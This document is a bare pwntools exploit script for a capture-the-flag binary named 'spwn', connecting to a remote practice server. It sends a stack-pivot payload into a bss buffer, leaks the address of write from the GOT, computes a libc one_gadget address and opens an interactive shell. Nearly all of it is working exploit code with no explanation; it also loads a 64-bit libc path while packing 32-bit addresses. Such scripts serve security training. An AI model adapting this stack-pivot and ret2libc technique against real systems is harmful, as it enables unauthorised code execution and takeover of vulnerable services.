from pwn import *

p = process('./spwn')
elf = ELF('./spwn')
libc = ELF('/home/linbei/桌面/pwn/libc/ubuntu16-64/libc-2.23.so')
p = remote('node5.buuoj.cn',28571)

buf_s = 0x804A300
leave = 0x8048408


payload = b'aaaa' + p32(elf.sym['write']) + p32(elf.sym['main']) + p32(1) + p32(elf.got['write']) + p32(4)
p.sendafter(b'What is your name?', payload)


payload = b'a'*24 + p32(buf_s) + p32(leave)
p.sendafter(b'What do you want to say?', payload)


write_addr = u32(p.recv(4))
one_gadget = write_addr - libc.sym['write'] +  0x3a80e

payload = b'aaaa' + p32(one_gadget)
p.sendafter(b'What is your name?', payload)

payload = b'a'*24 + p32(buf_s) + p32(leave)
p.sendafter(b'What do you want to say?', payload)

p.interactive()
